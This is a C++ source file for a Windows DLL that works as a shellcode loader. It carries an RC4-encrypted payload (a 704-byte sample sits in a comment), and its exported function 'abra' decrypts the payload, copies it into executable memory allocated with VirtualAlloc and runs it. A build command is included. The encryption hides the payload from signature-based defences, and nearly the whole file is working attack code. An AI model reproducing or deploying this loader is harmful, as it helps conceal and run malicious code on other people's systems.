/*
x86_64-w64-mingw32-g++ -s -D DLLEXPORT rc4_enc_dll.cpp -o rc4_shellcode.dll -shared

This is the file that will be made into a DLL. It contains the encrypted shellcode. The function
"abra" decrypts and runs the shellcode.
*/

#include "rc4_enc_dll.hpp"
#include "windows.h"

// This is the length of payload_encrypted. We need it because
// the encrypted payload could contain null bytes, which would
// be considered "the end" by most size-checkers.
// JUST COUNT IT.
const int enc_payload_len = 0;
/*
Example:
const int enc_payload_len=704;
*/
// This should be the rc4-encrypted payload.
// See the README for how to obtain one.
unsigned char payload_encrypted[] = "RC4-ENC PAYLOAD GOES HERE";
/*
Example:
// In this case, each line has 15 chars. Multiplication is your friend!
unsigned char payload_encrypted[] =
"\xda\xdb\x79\xa4\x73\xc1\xfd\x5d\xd3\xff\xa3\xd0\x61\xc4\xf4" //1 (*15)
"\xd9\x7a\x3a\xcc\xc5\x0a\x97\x18\xf3\x6c\xe2\xc5\xed\xac\xc4" //2 (*15)
"\x37\x51\xd2\x60\x9a\xe8\x54\xd3\x96\x5f\x45\xaa\xbc\x11\xd9"
"\x16\x7c\x1c\x7f\x66\x8d\x50\x6b\xe8\x4d\x37\x9f\x3b\x2c\x44"
"\x06\xec\xae\x9a\x07\x9f\xef\x76\x48\x6e\x88\xe9\xae\x16\xdc" //5
"\x66\xf6\xe0\x9c\x5b\x7c\xec\xaf\x20\x29\xe7\x0c\x73\x24\xfb"
"\xe5\x81\xf6\x15\xf0\xdc\xfc\xd9\xdc\x20\xb0\xf6\xd7\x5b\x66"
"\x43\xa4\x2a\xc0\x2d\x61\x11\x0b\xa1\x2c\x5e\xe3\x4e\x86\xd0"
"\x78\x97\x67\xd8\xe1\x3e\xf8\x12\x1b\x76\x38\xe5\x7c\xdf\x22"
"\xc2\x9a\x86\xb7\xe1\xcf\x2e\x8d\xcb\x56\xe4\xf5\x7c\x3e\xb7" //10
"\xf0\x19\x97\x03\xdc\xe8\x7e\xda\xe5\xae\x25\x54\x69\xcd\xca"
"\x8e\x76\x5c\xc7\xd6\x33\x81\xde\x48\x7b\xd8\x86\x98\xfa\x32"
"\x0e\xaf\x5b\xc2\xdd\xa2\x1d\xbe\x1f\x86\xa1\x8e\xc0\xfa\x7a"
"\x8a\xf2\x10\x5c\x9a\x0f\x0c\xc5\x09\x3d\x0b\xf6\xa4\x4d\x10"
"\xec\xeb\xce\x9f\x2e\xc9\x38\x49\x1f\x5e\xc5\x24\x55\xf4\x80" //15
"\xf3\x31\xf4\x05\x86\xe4\x80\x8b\xbf\x37\x90\x42\x9b\x46\xfb"
"\x21\x93\xd2\x35\xaf\x07\xc2\x24\x2c\x1b\x9c\x68\xf5\x86\x9e"
"\x32\x46\xa0\xf1\xa5\x47\xb3\xd1\xd1\xe1\x71\xf9\x3b\x01\x7c"
"\x06\xa2\x1a\xf8\xe9\x92\xb2\x0f\xb6\x62\x02\x03\xa4\x9d\xab"
"\x07\x07\xfa\xbc\x32\x84\x4c\x25\x8e\x78\xad\x78\x4d\x0a\x64" //20
"\xa0\x7d\xd1\x7d\x21\x1d\x18\xad\x88\xe5\x4c\x86\xf0\x10\x02"
"\x26\x75\x6c\x02\xc2\x33\xbe\xc2\xf8\xf9\x17\x25\xe4\x52\x39"
"\x5b\x89\xb7\x50\x01\xd7\xa4\x60\xbb\xbc\x4e\x99\x0e\x0c\x9b"
"\xad\x9e\xe7\x7d\x3c\x79\x96\x81\xba\x6d\x75\xa5\xcb\x78\xab"
"\x1d\x25\x97\xeb\x08\x39\x10\xee\x52\xdd\x20\xbe\xe0\x1f\xac" //25
"\xba\x2a\x21\x22\x76\x4c\x78\x29\x4c\xc9\xeb\x7d\x33\x53\x10"
"\x2a\x9d\x7b\x97\x60\x29\x25\x7e\xbe\xc7\x36\x13\xf6\x73\xec"
"\x5f\x96\x58\xae\xbf\x7d\x49\xaa\x7b\xbd\x0a\x0c\xcc\xa6\x6b"
"\xa3\x85\x55\xc3\x18\xa9\x47\x6e\x26\xe0\xc9\x67\x5c\xb0\xf8"
"\x01\x11\xda\x91\x94\x69\x55\xe3\x9a\xdc\x82\x97\x4c\x93\x33" //30
"\xe7\x4d\x20\x42\xc5\xea\xdf\xea\xda\xc9\x63\xc4\x6b\xb1\xb0"
"\x69\x61\xa7\x5c\x8b\x68\x13\x9c\x0f\xd8\xd1\xf6\x0b\x75\x00"
"\x4c\xf7\x4f\x22\x6f\x3b\x2b\x43\x65\xdc\x41\xf8\xca\x5d\x7a"
"\xf0\xb6\xc5\x59\xca\xf2\xdd\x11\x6a\xe7\x71\xbb\xf7\xa7\x8f"
"\x92\xfe\x74\x12\x0e\x3f\x3f\x02\xda\xaf\x49\x40\x69\x9b\x10" //35
"\x94\x49\x18\x9e\xbe\x09\x3d\x19\xc1\xd5\x22\x2f\x9e\xcd\x65"
"\xd1\x53\xe8\x72\x82\xdd\xcc\x70\xcf\xe1\x0c\x51\x07\x02\x15"
"\x1f\xc8\x27\xa7\xa4\xec\xb8\x81\x21\xae\x68\x5a\x57\xb2\x22"
"\xe6\xa7\xab\x04\x9e\x8a\x05\xdd\xf5\x74\xd1\xb0\xb9\x59\xc2"
"\x26\xec\x0c\x36\x09\x4e\xa7\x87\xda\x5e\x92\x3d\x67\x25\xb4" //40
"\x4d\x74\x52\x49\x52\x97\x7e\x60\x41\x68\x06\xc1\x5e\x21\x2f"
"\xa7\xa3\x46\xcb\x92\xfd\x4b\xa5\xdf\x14\xcf\xb3\x74\xc9\x50"
"\xd4\xd1\xb0\x10\x82\x65\x38\x81\x5c\x8c\xde\x86\xa7\xb6\xb3"
"\x6b\x73\xbe\xff\x76\x4a\x1f\x27\x36\x32\x63\x62\x38\x7f\xb7"
"\xdf\xd1\x11\x44\x01\x10\xd0\x89\x81\x72\xc5\x50\x2f\x74\xd4" //45
"\xb7\xdc\x2e\xd1\xfe\xe6\x32\xc8\x95\xed\x59\xdf\x95\xf0\xaf" //46 (*15)
"\xcd\x2f\x68\x7f\xa6\xb8\xaf\x37\x1c\x65\xd9\x16\x3b\x7d"; //46*15+14 = 704
*/

// This wonderful function encrypts and decrypts RC4. All args are pretty self-explanatory.
// outputarr[] must have length msglen.
// rc4_crypt is not exported.
int rc4_crypt(unsigned char key[], unsigned char message[],
    int keylen, int msglen, unsigned char outputarr[])
{
    // Create a bunch of variables.
    int S[256];
    // i and j are indicies in the permutation array, t is a temp, and n is the current pos in msg.
    int i = 0, j = 0, t, n;

    // Initialize the permutation array with the identity.
    for (i = 0; i < 256; i++) {
        S[i] = i;
    }

    // Mix up that permutation array!
    for (i = 0; i < 256; i++) {
        // Get the next j-value
        j = (j + S[i] + key[i % keylen]) % 256;

        // Swap S[i] and S[j].
        t = S[i];
        S[i] = S[j];
        S[j] = t;
    }

    // Reset i and j.
    i = 0;
    j = 0;
    // Loop through each character of the message.
    for (n = 0; n < msglen; n++) {
        // Increment i.
        i = (i + 1) % 256;
        // Get the next value of j.
        j = (j + S[i]) % 256;
        // Swap S[i] and S[j].
        t = S[i];
        S[i] = S[j];
        S[j] = t;
        // Xor our pseudorandom output with a message byte.
        // Store the result in the outputarr.
        outputarr[n] = message[n] ^ S[(S[i] + S[j]) % 256];
    }

    return 0;
}

// Magic function... who knows what it does?
// Fortunately, I do! It decrypts and runs the shellcode defined above.
void abra(unsigned char key[], int keylen)
{
    // Let's allocate ourselves an output array.
    // RC4 has the same size encrypted and decrypted.
    unsigned char payload[enc_payload_len];

    // Let's decrypt that shellcode!
    rc4_crypt(key, payload_encrypted, keylen, enc_payload_len, payload);

    // Allocate space for our function.
    void* func = VirtualAlloc(0, enc_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy our shellcode in.
    memcpy(func, payload, enc_payload_len);

    // And run it! We're done.
    ((void (*)())func)();
}
